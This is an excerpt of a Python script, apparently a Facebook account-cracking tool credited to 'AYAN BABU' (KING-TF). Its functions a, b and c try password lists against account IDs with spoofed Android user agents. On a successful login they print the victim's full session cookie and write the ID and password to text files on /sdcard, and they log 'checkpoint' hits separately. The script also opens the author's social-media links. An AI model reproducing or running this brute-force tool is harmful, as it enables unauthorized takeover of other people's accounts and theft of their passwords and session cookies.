...
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
os.system('xdg-open https://www.facebook.com/digon.sarkar?mibextid=ZbWKwL')
...
os.system("xdg-open https://github.com/KING-TF")
logo = ("""
...
\033[38;5;46m[-]\033[38;5;46mAUTHOR    :\033[38;5;46m AYAN BABU        
\033[38;5;46m[-]\033[38;5;46mGITHUB    :\033[38;5;46m KING-TF    
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801846201363')
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/digon.sarkar?mibextid=ZbWKwL');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/KING-TF');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;32m[\033[1;32mXD\033[1;32m] \033[1;32m%s/%s\033[1;32m \033[1;32m[\033[1;32mOK:%s\033[1;32m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;32m [A+S-OK] '+cid+' | '+ps+'\33[1;32m')
                #print(f'\r\33[1;92m [🚀] Number : {uid}')
                print(f'\r\033[38;5;46m [♥] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/A+S5-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\33[1;91m[A+S-CP] {uid}|{ps}")
                print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/A+S-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[XD] \033[1;32m%s\033[m |\033[m[\033[mOK:\033[1;32m%s\033[m] '%(loop,len(oks))),
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;32mXD\033[1;32m] \033[1;32m%s/%s\033[1;32m \033[1;32m[\033[1;32mOK:%s\033[1;32m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; Infinix X6819 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.103 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97',}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\033[1;32m       [A+S-OK] '+uid+' | '+ps+'\33[0;92m')
                #print(f'\r\33[1;92m       [🚀] Number : {uid}')            
                print(f'\r\033[38;5;46m [🚀] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/A+S-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def c(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/A+S-ok.txt', 'a').write(cid+' | '+ps+'\n')
                break
            else:
                continue
        loop+=1        
